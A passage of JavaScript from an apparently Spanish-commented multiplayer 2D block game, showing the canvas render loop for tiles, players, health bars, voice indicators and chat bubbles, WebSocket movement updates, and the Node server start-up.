                    else if (player.vy < 0) { player.y = Math.floor((player.y + player.vy)/TILE)*TILE + TILE; }
                    player.vy = 0;
                }
                
                handleMouseHold();

                let now = Date.now();
                if (now - lastSendTime > 40 && ws && ws.readyState === WebSocket.OPEN && myId) {
                    lastSendTime = now;
                    ws.send(JSON.stringify({
                        type: 'move',
                        state: { x: player.x, y: player.y, vx: player.vx, vy: player.vy, facingRight: player.facingRight, item: hotbarSlots[selectedSlot] }
                    }));
                }

                camera.x += (player.x + player.w/2 - cv.width/2 - camera.x) * 0.1;
                camera.y += (player.y + player.h/2 - cv.height/2 - camera.y) * 0.1;
            }

            ctx.fillStyle = '#87CEEB'; ctx.fillRect(0, 0, cv.width, cv.height);
            ctx.save(); ctx.translate(Math.floor(-camera.x), Math.floor(-camera.y));

            const sCol = Math.max(0, Math.floor(camera.x / TILE)), eCol = Math.min(CHUNK_W, Math.floor((camera.x + cv.width) / TILE) + 2);
            const sRow = Math.max(0, Math.floor(camera.y / TILE)), eRow = Math.min(CHUNK_H, Math.floor((camera.y + cv.height) / TILE) + 2);

            for (let x = sCol; x < eCol; x++) {
                for (let y = sRow; y < eRow; y++) {
                    let id = world[x][y];
                    if (id !== 0) {
                        ctx.fillStyle = BLOCKS[id].hex; ctx.fillRect(x * TILE, y * TILE, TILE, TILE);
                        ctx.fillStyle = BLOCKS[id].acc;
                        ctx.fillRect(x * TILE + TILE - 12, y * TILE + TILE - 12, 12, 12);
                    }
                }
            }

            // DIBUJAR JUGADORES ENEMIGOS
            for (let id in otherPlayers) {
                let p = otherPlayers[id];
                let px = p.x, py = p.y;
                let bodyColor = (p.flashRed && p.flashRed-- > 0) ? '#ff0000' : (p.color || '#3b82f6');

                // Anillo de Voz si el jugador tiene micro activo
                if (p.voiceActive) {
                    ctx.strokeStyle = '#22c55e'; ctx.lineWidth = 3;
                    ctx.beginPath(); ctx.arc(px + 24, py + 48, 42, 0, Math.PI * 2); ctx.stroke();
                    ctx.font = '16px Arial'; ctx.fillText('🎙️', px + 24, py - 30);
                }

                ctx.fillStyle = '#1e293b'; ctx.fillRect(px + 12, py + 50, 24, 46);
                ctx.fillStyle = bodyColor; ctx.fillRect(px + 12, py + 20, 24, 30);
                ctx.fillStyle = '#ffcc99'; ctx.fillRect(px + 12, py - 4, 24, 24);
                ctx.fillStyle = '#000'; ctx.fillRect(px + (p.facingRight ? 26 : 14), py + 4, 4, 6);

                if (p.item === 10) { ctx.font = "30px Arial"; ctx.fillText("🗡️", px + (p.facingRight ? 35 : -15), py + 50); }

                ctx.fillStyle = "white"; ctx.font = "14px Arial"; ctx.textAlign = "center";
                ctx.fillText(id, px + 24, py - 18);
                ctx.fillStyle = "#333"; ctx.fillRect(px, py - 12, 48, 6);
                ctx.fillStyle = "#ef4444"; ctx.fillRect(px, py - 12, Math.max(0, (p.hp/100)*48), 6);

                // Bocadillo de Chat sobre el personaje
                if (p.chatMsg && Date.now() < p.chatExpiry) {
                    ctx.font = '13px Arial';
                    let tw = ctx.measureText(p.chatMsg).width;
                    ctx.fillStyle = 'rgba(0,0,0,0.75)';
                    ctx.fillRect(px + 24 - tw/2 - 6, py - 46, tw + 12, 22);
                    ctx.fillStyle = '#ffffff';
                    ctx.fillText(p.chatMsg, px + 24, py - 30);
                }
            }

            // DIBUJAR JUGADOR PROPIO
            let px = player.x, py = player.y;
            let myColor = (player.flashRed && player.flashRed-- > 0) ? '#ff0000' : '#22c55e';
            
            if (isVoiceActive) {
                ctx.strokeStyle = '#22c55e'; ctx.lineWidth = 3;
                ctx.beginPath(); ctx.arc(px + 24, py + 48, 42, 0, Math.PI * 2); ctx.stroke();
                ctx.font = '16px Arial'; ctx.fillText('🎙️', px + 24, py - 30);
            }

            ctx.fillStyle = '#1e293b'; ctx.fillRect(px + 12, py + 50, 24, 46);
            ctx.fillStyle = myColor; ctx.fillRect(px + 12, py + 20, 24, 30);
            ctx.fillStyle = '#ffcc99'; ctx.fillRect(px + 12, py - 4, 24, 24);
            ctx.fillStyle = '#000'; ctx.fillRect(px + (player.facingRight ? 26 : 14), py + 4, 4, 6);
            if (hotbarSlots[selectedSlot] === 10) { ctx.font = "30px Arial"; ctx.fillText("🗡️", px + (player.facingRight ? 35 : -15), py + 50); }

            // Bocadillo de Chat sobre personaje propio
            if (player.chatMsg && Date.now() < player.chatExpiry) {
                ctx.font = '13px Arial';
                let tw = ctx.measureText(player.chatMsg).width;
                ctx.fillStyle = 'rgba(0,0,0,0.75)';
                ctx.fillRect(px + 24 - tw/2 - 6, py - 46, tw + 12, 22);
                ctx.fillStyle = '#ffffff';
                ctx.fillText(player.chatMsg, px + 24, py - 30);
            }

            ctx.restore(); requestAnimationFrame(update);
        }
        update();
    }
    </script>
</body>
</html>`);
});

server.listen(PORT, () => {
    console.log('Servidor corriendo en el puerto ' + PORT);
});
